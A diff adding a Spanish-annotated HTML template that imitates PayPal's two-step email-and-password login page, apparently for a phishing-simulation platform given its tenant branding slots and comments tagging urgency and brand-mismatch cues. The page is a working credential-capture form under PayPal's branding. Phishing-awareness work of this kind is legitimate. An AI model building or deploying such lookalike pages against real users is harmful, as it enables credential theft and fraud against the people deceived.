@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="{{idioma}}">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>{{tituloPagina}}</title>
+<style>
+  /* Recreación del inicio de sesión de PayPal. Escrita a mano, no un volcado
+     del sitio real. */
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 15px;
+    color: #2c2e2f;
+    background-color: #f5f7fa;
+  }
+
+  .envoltorio { width: 100%; max-width: 400px; }
+
+  .marca-tenant { margin-bottom: 16px; min-height: 24px; text-align: center; }
+  .marca-tenant img { max-width: 150px; max-height: 42px; display: block; margin: 0 auto; }
+
+  .marca-pp { text-align: center; margin-bottom: 22px; }
+  .marca-pp span.pay { color: #003087; font-weight: 700; font-size: 24px; }
+  .marca-pp span.pal { color: #009cde; font-weight: 700; font-size: 24px; }
+
+  .tarjeta {
+    background: #ffffff;
+    border: 1px solid #e8ecf1;
+    border-radius: 8px;
+    padding: 32px 28px;
+    box-shadow: 0 1px 2px rgba(0,0,0,.06);
+  }
+
+  h1 { margin: 0 0 20px; font-size: 19px; font-weight: 400; text-align: center; }
+
+  .aviso {
+    margin: 0 0 18px;
+    font-size: 13px;
+    line-height: 19px;
+    color: #8a5a00;
+    background: #fff7e6;
+    padding: 11px 13px;
+    border-radius: 6px;
+  }
+  .aviso:empty { display: none; padding: 0; margin: 0; }
+
+  .grupo-campo { margin-bottom: 16px; }
+  label { display: block; margin-bottom: 6px; font-size: 13px; color: #6c7378; }
+
+  .campo {
+    width: 100%;
+    padding: 11px 13px;
+    font-family: inherit;
+    font-size: 15px;
+    color: #2c2e2f;
+    background: #ffffff;
+    border: 1px solid #cbd2d6;
+    border-radius: 6px;
+    outline: none;
+  }
+  .campo:focus { border: 2px solid #0070ba; padding: 10px 12px; }
+
+  .error { margin: 6px 0 0; font-size: 12.5px; color: #c40000; }
+  .error:empty { display: none; }
+
+  .identidad {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 18px;
+    font-size: 14px;
+  }
+  .volver { border: 0; background: none; padding: 0; cursor: pointer; color: #0070ba; font-size: 17px; line-height: 1; }
+
+  .enlaces { text-align: center; margin: 14px 0 0; font-size: 13.5px; }
+  .enlaces a { color: #0070ba; text-decoration: none; }
+  .enlaces a:hover { text-decoration: underline; }
+
+  .boton {
+    width: 100%;
+    padding: 13px;
+    font-family: inherit;
+    font-size: 16px;
+    font-weight: 700;
+    color: #ffffff;
+    background: #0070ba;
+    border: 0;
+    border-radius: 22px;
+    cursor: pointer;
+  }
+  .boton:hover { background: #005ea6; }
+
+  .separador { display: flex; align-items: center; gap: 10px; margin: 20px 0; color: #9099a2; font-size: 12px; }
+  .separador::before, .separador::after { content: ''; flex: 1; height: 1px; background: #e8ecf1; }
+
+  .pie {
+    display: flex;
+    justify-content: center;
+    gap: 18px;
+    margin-top: 20px;
+    font-size: 12px;
+    color: #6c7378;
+  }
+  .pie a { color: #6c7378; text-decoration: none; }
+
+  .paso[hidden] { display: none; }
+</style>
+</head>
+<body>
+
+<div class="envoltorio">
+  <div class="marca-tenant">{{logoHtml}}</div>
+  <div class="marca-pp"><span class="pay">Pay</span><span class="pal">Pal</span></div>
+
+  <div class="tarjeta">
+    <form method="post" action="" autocomplete="off">
+
+      <div class="paso" id="paso-email">
+        <h1>{{tituloPaso1}}</h1>
+        <!--@bloque:aviso-verificacion @senal:urgencia-->
+        <p class="aviso">{{aviso}}</p>
+        <!--@/bloque-->
+        <div class="grupo-campo">
+          <label for="email">{{etiquetaEmail}}</label>
+          <input class="campo" type="email" id="email" name="email" required autofocus>
+          <p class="error" id="error-email" hidden>{{errorEmail}}</p>
+        </div>
+        <button class="boton" type="button" id="btn-siguiente">{{btnSiguiente}}</button>
+        <div class="enlaces"><a href="#">{{enlaceOlvidoEmail}}</a></div>
+      </div>
+
+      <div class="paso" id="paso-password" hidden>
+        <div class="identidad">
+          <button class="volver" type="button" id="btn-volver" aria-label="{{btnVolver}}">&#8592;</button>
+          <span id="eco-email"></span>
+        </div>
+        <h1>{{tituloPaso2}}</h1>
+        <div class="grupo-campo">
+          <label for="password">{{etiquetaPassword}}</label>
+          <input class="campo" type="password" id="password" name="password" required>
+        </div>
+        <button class="boton" type="submit">{{btnEntrar}}</button>
+        <div class="enlaces"><a href="#">{{enlaceOlvidoPassword}}</a></div>
+      </div>
+
+    </form>
+
+    <!--@bloque:cta-registro @opcional-->
+    <div class="separador">{{textoSeparador}}</div>
+    <div class="enlaces"><a href="#">{{enlaceCrearCuenta}}</a></div>
+    <!--@/bloque-->
+  </div>
+
+  <!--@bloque:pie-legal @senal:!incoherencia-marca-->
+  <div class="pie">
+    <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener">{{enlaceAyuda}}</a>
+    <a href="https://www.paypal.com/myaccount/privacy/statement" target="_blank" rel="noopener">{{enlacePrivacidad}}</a>
+    <a href="https://www.paypal.com/us/legalhub/useragreement-full" target="_blank" rel="noopener">{{enlaceCondiciones}}</a>
+  </div>
+  <!--@/bloque-->
+</div>
+
+<script>
+  (function () {
+    var email = document.getElementById('email');
+    var errorEmail = document.getElementById('error-email');
+    var pasoEmail = document.getElementById('paso-email');
+    var pasoPassword = document.getElementById('paso-password');
+    var eco = document.getElementById('eco-email');
+
+    function avanzar() {
+      if (!email.value || email.value.indexOf('@') === -1) {
+        errorEmail.hidden = false;
+        email.focus();
+        return;
+      }
+      errorEmail.hidden = true;
+      eco.textContent = email.value;
+      pasoEmail.hidden = true;
+      pasoPassword.hidden = false;
+      document.getElementById('password').focus();
+    }
+
+    document.getElementById('btn-siguiente').addEventListener('click', avanzar);
+    email.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); avanzar(); } });
+
+    document.getElementById('btn-volver').addEventListener('click', function () {
+      pasoPassword.hidden = true;
+      pasoEmail.hidden = false;
+      email.focus();
+    });
+  })();
+</script>
+
+</body>
+</html>
